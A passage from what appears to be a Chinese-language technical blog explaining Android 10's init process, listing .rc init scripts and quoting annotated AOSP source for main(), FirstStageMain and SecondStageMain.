class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>netd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/m</span>ediametrics.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/m</span>ediadrmserver.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>wificond.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>vdc.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>cameraserver.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/g</span>sid.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>consyslogger.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>logtagd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/m</span>alloc_debug_option.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>bootanim.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>logcatd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>batterywarning.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>statsd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>perfetto.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/i</span>nit.connectivity.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>flags_health_check.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/m</span>tpd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/i</span>nit.thermald.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/m</span>dnsd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>duraspeed.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>emdlogger3.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>audioserver.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>terserver.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>heapprofd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>netdiag.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>bpfloader.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/i</span>nit.vtservice.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>hw/init.aee.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>hw/vendor_init_as_system.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>emdlogger5.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/i</span>orapd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>wifi-events.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>tombstoned.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>kpoc_charger.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>apexd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>traceur.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>android.hidl.allocator@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/g</span>atekeeperd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>atrace_userdebug.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>lmkd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>rss_hwm_reset.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/i</span>nstalld.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>racoon.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>emdlogger2.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>emdlogger1.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>em_svr.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>dumpstate.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>aee_aed.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>vold.rc<br>.<span class="hljs-regexp">/root/i</span>nit.rc<br>.<span class="hljs-regexp">/root/i</span>nit.zygote32.rc<br>.<span class="hljs-regexp">/root/i</span>nit.environ.rc<br>.<span class="hljs-regexp">/root/u</span>eventd.rc<br>.<span class="hljs-regexp">/root/i</span>nit.zygote64_32.rc<br>.<span class="hljs-regexp">/root/i</span>nit.preload.rc<br>.<span class="hljs-regexp">/root/i</span>nit.usb.configfs.rc<br>.<span class="hljs-regexp">/root/i</span>nit.usb.rc<br></code></pre></td></tr></table></figure><h3 id="2-1-启动"><a href="#2-1-启动" class="headerlink" title="2.1 启动"></a>2.1 启动</h3><p>当init进程启动后会调用/system/core/init/main.cpp的main()方法</p> <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"> <span class="hljs-built_in">int</span> main(<span class="hljs-built_in">int</span> argc, <span class="hljs-built_in">char</span>** argv) &#123;<br>#<span class="hljs-keyword">if</span> <span class="hljs-constructor">__has_feature(<span class="hljs-params">address_sanitizer</span>)</span><br>    <span class="hljs-constructor">__asan_set_error_report_callback(AsanReportCallback)</span>;<br>#endif<br><br>    <span class="hljs-keyword">if</span> (!strcmp(basename(argv<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>), <span class="hljs-string">&quot;ueventd&quot;</span>)) &#123;<br>        return ueventd<span class="hljs-constructor">_main(<span class="hljs-params">argc</span>, <span class="hljs-params">argv</span>)</span>;   <span class="hljs-comment">//ueventd.cpp入口函数，初始化uevent</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (argc &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!strcmp(argv<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>, <span class="hljs-string">&quot;subcontext&quot;</span>)) &#123;<br>            android::base::<span class="hljs-constructor">InitLogging(<span class="hljs-params">argv</span>, &amp;<span class="hljs-params">android</span>::<span class="hljs-params">base</span>::KernelLogger)</span>;<br>            const BuiltinFunctionMap function_map;<br><br>            return <span class="hljs-constructor">SubcontextMain(<span class="hljs-params">argc</span>, <span class="hljs-params">argv</span>, &amp;<span class="hljs-params">function_map</span>)</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!strcmp(argv<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>, <span class="hljs-string">&quot;selinux_setup&quot;</span>)) &#123;<br>            <span class="hljs-comment">// This function initializes SELinux then execs init to run in the init SELinux context.</span><br>            return <span class="hljs-constructor">SetupSelinux(<span class="hljs-params">argv</span>)</span>; <span class="hljs-comment">//对SELinux进行初始化，并通过execs的系统调用开启init进程</span><br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!strcmp(argv<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>, <span class="hljs-string">&quot;second_stage&quot;</span>)) &#123;<br>            return <span class="hljs-constructor">SecondStageMain(<span class="hljs-params">argc</span>, <span class="hljs-params">argv</span>)</span>;  <span class="hljs-comment">//第二阶段 init.cpp入口函数</span><br>        &#125;<br>    &#125;<br><br>    return <span class="hljs-constructor">FirstStageMain(<span class="hljs-params">argc</span>, <span class="hljs-params">argv</span>)</span>;   <span class="hljs-comment">//第一阶段</span><br>&#125;<br></code></pre></td></tr></table></figure><p>注:<strong>Android10中并不只是调用init::main，而是把部分流程性的判断放到的mian.cpp中来做，如果直接去找init.cpp中的main函数，其实是找不到入口的</strong></p><h3 id="2-2-一阶段启动"><a href="#2-2-一阶段启动" class="headerlink" title="2.2 一阶段启动"></a>2.2 一阶段启动</h3><p>第一阶段init位于 system/core/init/first_stage_init.cpp的FirstStageMain方法,主要是设置umask，部分代码如下</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> <span class="hljs-constructor">FirstStageMain(<span class="hljs-params">int</span> <span class="hljs-params">argc</span>, <span class="hljs-params">char</span><span class="hljs-operator">**</span> <span class="hljs-params">argv</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (REBOOT_BOOTLOADER_ON_PANIC) &#123;<br>        <span class="hljs-constructor">InstallRebootSignalHandlers()</span>;<br>    &#125;<br><br>    boot_clock::time_point start_time = boot_clock::now<span class="hljs-literal">()</span>;<br><br>    std::vector&lt;std::pair&lt;std::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">int</span>&gt;&gt; errors;<br>#define <span class="hljs-constructor">CHECKCALL(<span class="hljs-params">x</span>)</span> \<br>    <span class="hljs-keyword">if</span> (x != <span class="hljs-number">0</span>) errors.emplace<span class="hljs-constructor">_back(#<span class="hljs-params">x</span> <span class="hljs-string">&quot; failed&quot;</span>, <span class="hljs-params">errno</span>)</span>;<br><br>    <span class="hljs-comment">// Clear the umask.</span><br>    umask(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-constructor">CHECKCALL(<span class="hljs-params">clearenv</span>()</span>);<br>    <span class="hljs-constructor">CHECKCALL(<span class="hljs-params">setenv</span>(<span class="hljs-string">&quot;PATH&quot;</span>, <span class="hljs-params">_PATH_DEFPATH</span>, 1)</span>);<br>    <span class="hljs-comment">// Get the basic filesystem setup we need put together in the initramdisk</span><br>    <span class="hljs-comment">// on / and then we&#x27;ll let the rc file figure out the rest.</span><br>    <span class="hljs-constructor">CHECKCALL(<span class="hljs-params">mount</span>(<span class="hljs-string">&quot;tmpfs&quot;</span>, <span class="hljs-string">&quot;/dev&quot;</span>, <span class="hljs-string">&quot;tmpfs&quot;</span>, MS_NOSUID, <span class="hljs-string">&quot;mode=0755&quot;</span>)</span>);<br>    <span class="hljs-constructor">CHECKCALL(<span class="hljs-params">mkdir</span>(<span class="hljs-string">&quot;/dev/pts&quot;</span>, 0755)</span>);<br>    <span class="hljs-constructor">CHECKCALL(<span class="hljs-params">mkdir</span>(<span class="hljs-string">&quot;/dev/socket&quot;</span>, 0755)</span>);<br>    <span class="hljs-constructor">CHECKCALL(<span class="hljs-params">mount</span>(<span class="hljs-string">&quot;devpts&quot;</span>, <span class="hljs-string">&quot;/dev/pts&quot;</span>, <span class="hljs-string">&quot;devpts&quot;</span>, 0, NULL)</span>);<br>    <br> ....<br><br>    return <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3-二阶段启动"><a href="#2-3-二阶段启动" class="headerlink" title="2.3 二阶段启动"></a>2.3 二阶段启动</h3><p>第二阶段init位于system/core/init/init.cpp的SecondStageMain方法,该部分负责加载.rc文件,部分代码如下</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">SecondStageMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;<br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">    *init crash时重启引导加载程序</span><br><span class="hljs-comment">    *这个函数主要作用将各种信号量，如SIGABRT,SIGBUS等的行为设置为SA_RESTART,一旦监听到这些信号即执行重启系统</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (REBOOT_BOOTLOADER_ON_PANIC) &#123;<br>        <span class="hljs-built_in">InstallRebootSignalHandlers</span>();<br>    &#125;<br> <br>    <span class="hljs-comment">//把标准输入、标准输出和标准错误重定向到空设备文件&quot;/dev/null&quot;</span><br>    <span class="hljs-built_in">SetStdioToDevNull</span>(argv);<br>    <span class="hljs-comment">//在/dev目录下挂载好 tmpfs 以及 kmsg </span><br>    <span class="hljs-comment">//这样就可以初始化 /kernel Log 系统，供用户打印log</span><br>    <span class="hljs-built_in">InitKernelLogging</span>(argv);<br>    <span class="hljs-built_in">LOG</span>(INFO) &lt;&lt; <span class="hljs-string">&quot;init second stage started!&quot;</span>;<br> <br>    <span class="hljs-comment">// 01. 创建进程会话密钥并初始化属性系统</span><br>    <span class="hljs-built_in">keyctl_get_keyring_ID</span>(KEY_SPEC_SESSION_KEYRING, <span class="hljs-number">1</span>);<br> <br>    <span class="hljs-comment">//创建 /dev/.booting 文件，就是个标记，表示booting进行中</span><br>    <span class="hljs-built_in">close</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/.booting&quot;</span>, O_WRONLY | O_CREAT | O_CLOEXEC, <span class="hljs-number">0000</span>));<br> <br>    <span class="hljs-comment">// 初始化属性系统，并从指定文件读取属性</span><br>    <span class="hljs-built_in">property_init</span>();<br> <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1.如果参数同时从命令行和DT传过来，DT的优先级总是大于命令行的</span><br><span class="hljs-comment">     * 2.DT即device-tree，中文意思是设备树，这里面记录自己的硬件配置和系统运行参数，</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">process_kernel_dt</span>(); <span class="hljs-comment">// 处理 DT属性</span><br>    <span class="hljs-built_in">process_kernel_cmdline</span>(); <span class="hljs-comment">// 处理命令行属性</span><br> <br>    <span class="hljs-comment">// 处理一些其他的属性</span><br>    <span class="hljs-built_in">export_kernel_boot_props</span>();<br> <br>    <span class="hljs-comment">// Make the time that init started available for bootstat to log.</span><br>    <span class="hljs-built_in">property_set</span>(<span class="hljs-string">&quot;ro.boottime.init&quot;</span>, <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;INIT_STARTED_AT&quot;</span>));<br>    <span class="hljs-built_in">property_set</span>(<span class="hljs-string">&quot;ro.boottime.init.selinux&quot;</span>, <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;INIT_SELINUX_TOOK&quot;</span>));<br> <br>    <span class="hljs-comment">// Set libavb version for Framework-only OTA match in Treble build.</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* avb_version = <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;INIT_AVB_VERSION&quot;</span>);<br>    <span class="hljs-keyword">if</span> (avb_version) <span class="hljs-built_in">property_set</span>(<span class="hljs-string">&quot;ro.boot.avb_version&quot;</span>, avb_version);<br> <br>    <span class="hljs-comment">// See if need to load debug props to allow adb root, when the device is unlocked.</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* force_debuggable_env = <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;INIT_FORCE_DEBUGGABLE&quot;</span>);<br>    <span class="hljs-keyword">if</span> (force_debuggable_env &amp;&amp; AvbHandle::<span class="hljs-built_in">IsDeviceUnlocked</span>()) &#123;<br>        load_debug_prop = <span class="hljs-string">&quot;true&quot;</span>s == force_debuggable_env;<br>    &#125;<br> <br>    <span class="hljs-comment">// 基于cmdline设置memcg属性</span><br>    <span class="hljs-keyword">bool</span> memcg_enabled = android::base::<span class="hljs-built_in">GetBoolProperty</span>(<span class="hljs-string">&quot;ro.boot.memcg&quot;</span>,<span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">if</span> (memcg_enabled) &#123;<br>       <span class="hljs-comment">// root memory control cgroup</span><br>       <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;/dev/memcg&quot;</span>, <span class="hljs-number">0700</span>);<br>       <span class="hljs-built_in">chown</span>(<span class="hljs-string">&quot;/dev/memcg&quot;</span>,AID_ROOT,AID_SYSTEM);<br>       <span class="hljs-built_in">mount</span>(<span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-string">&quot;/dev/memcg&quot;</span>, <span class="hljs-string">&quot;cgroup&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;memory&quot;</span>);<br>       <span class="hljs-comment">// app mem cgroups, used by activity manager, lmkd and zygote</span><br>       <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;/dev/memcg/apps/&quot;</span>,<span class="hljs-number">0755</span>);<br>       <span class="hljs-built_in">chown</span>(<span class="hljs-string">&quot;/dev/memcg/apps/&quot;</span>,AID_SYSTEM,AID_SYSTEM);<br>       <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;/dev/memcg/system&quot;</span>,<span class="hljs-number">0550</span>);<br>       <span class="hljs-built_in">chown</span>(<span class="hljs-string">&quot;/dev/memcg/system&quot;</span>,AID_SYSTEM,AID_SYSTEM);<br>    &#125;<br> <br>    <span class="hljs-comment">// 清空这些环境变量，之前已经存到了系统属性中去了</span><br>    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;INIT_STARTED_AT&quot;</span>);<br>    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;INIT_SELINUX_TOOK&quot;</span>);<br>    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;INIT_AVB_VERSION&quot;</span>);<br>    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;INIT_FORCE_DEBUGGABLE&quot;</span>);<br> <br>    <span class="hljs-comment">// Now set up SELinux for second stage.</span><br>    <span class="hljs-built_in">SelinuxSetupKernelLogging</span>();<br>    <span class="hljs-built_in">SelabelInitialize</span>();<br> <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 02. 进行SELinux第二阶段并恢复一些文件安全上下文 </span><br><span class="hljs-comment">     * 恢复相关文件的安全上下文,因为这些文件是在SELinux安全机制初始化前创建的，</span><br><span class="hljs-comment">     * 所以需要重新恢复上下文</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">SelinuxRestoreContext</span>();<br> <br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 03. 新建epoll并初始化子进程终止信号处理函数</span><br><span class="hljs-comment">    *  创建epoll实例，并返回epoll的文件描述符</span><br><span class="hljs-comment">    */</span><br>    Epoll epoll;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> result = epoll.<span class="hljs-built_in">Open</span>(); !result) &#123;<br>        <span class="hljs-built_in">PLOG</span>(FATAL) &lt;&lt; result.<span class="hljs-built_in">error</span>();<br>    &#125;<br> <br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">     *主要是创建handler处理子进程终止信号，注册一个signal到epoll进行监听</span><br><span class="hljs-comment">     *进行子继承处理</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">InstallSignalFdHandler</span>(&amp;epoll);<br> <br>    <span class="hljs-comment">// 进行默认属性配置相关的工作</span><br>    <span class="hljs-built_in">property_load_boot_defaults</span>(load_debug_prop);<br>    <span class="hljs-built_in">UmountDebugRamdisk</span>();<br>    <span class="hljs-built_in">fs_mgr_vendor_overlay_mount_all</span>();<br>    <span class="hljs-built_in">export_oem_lock_status</span>();<br> <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     *04. 设置其他系统属性并开启系统属性服务</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">StartPropertyService</span>(&amp;epoll);<br>    <span class="hljs-function">MountHandler <span class="hljs-title">mount_handler</span><span class="hljs-params">(&amp;epoll)</span></span>;<br> <br>    <span class="hljs-comment">//为USB存储设置udc Contorller, sys/class/udc</span><br>    <span class="hljs-built_in">set_usb_controller</span>();<br> <br>    <span class="hljs-comment">// 匹配命令和函数之间的对应关系</span><br>    <span class="hljs-keyword">const</span> BuiltinFunctionMap function_map;<br>    Action::<span class="hljs-built_in">set_function_map</span>(&amp;function_map);<br> <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">SetupMountNamespaces</span>()) &#123;<br>        <span class="hljs-built_in">PLOG</span>(FATAL) &lt;&lt; <span class="hljs-string">&quot;SetupMountNamespaces failed&quot;</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 初始化文件上下文</span><br>    subcontexts = <span class="hljs-built_in">InitializeSubcontexts</span>();<br> <br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment">     *05 解析init.rc等文件，建立rc文件的action 、service，启动其他进程</span><br><span class="hljs-comment">     */</span><br>    ActionManager&amp; am = ActionManager::<span class="hljs-built_in">GetInstance</span>();<br>    ServiceList&amp; sm = ServiceList::<span class="hljs-built_in">GetInstance</span>();<br> <br>    <span class="hljs-comment">//加载.rc文件</span><br>    <span class="hljs-built_in">LoadBootScripts</span>(am, sm);<br> <br>    <span class="hljs-comment">// Turning this on and letting the INFO logging be discarded adds 0.2s to</span><br>    <span class="hljs-comment">// Nexus 9 boot time, so it&#x27;s disabled by default.</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span>) <span class="hljs-built_in">DumpState</span>();<br> <br>    <span class="hljs-comment">// 当GSI脚本running时，确保GSI状态可用.</span><br>    <span class="hljs-keyword">if</span> (android::gsi::<span class="hljs-built_in">IsGsiRunning</span>()) &#123;<br>        <span class="hljs-built_in">property_set</span>(<span class="hljs-string">&quot;ro.gsid.image_running&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">property_set</span>(<span class="hljs-string">&quot;ro.gsid.image_running&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>    &#125;<br> <br> <br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(SetupCgroupsAction, <span class="hljs-string">&quot;SetupCgroups&quot;</span>);<br> <br>    <span class="hljs-comment">// 执行rc文件中触发器为 on early-init 的语句</span><br>    am.<span class="hljs-built_in">QueueEventTrigger</span>(<span class="hljs-string">&quot;early-init&quot;</span>);<br> <br>    <span class="hljs-comment">// 等冷插拔设备初始化完成</span><br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(wait_for_coldboot_done_action, <span class="hljs-string">&quot;wait_for_coldboot_done&quot;</span>);<br> <br>    <span class="hljs-comment">// 开始查询来自 /dev的 action</span><br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(MixHwrngIntoLinuxRngAction, <span class="hljs-string">&quot;MixHwrngIntoLinuxRng&quot;</span>);<br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(SetMmapRndBitsAction, <span class="hljs-string">&quot;SetMmapRndBits&quot;</span>);<br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(SetKptrRestrictAction, <span class="hljs-string">&quot;SetKptrRestrict&quot;</span>);<br> <br>    <span class="hljs-comment">// 设备组合键的初始化操作</span><br>    Keychords keychords;<br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(<br>        [&amp;epoll, &amp;keychords](<span class="hljs-keyword">const</span> BuiltinArguments&amp; args) -&gt; Result&lt;Success&gt; 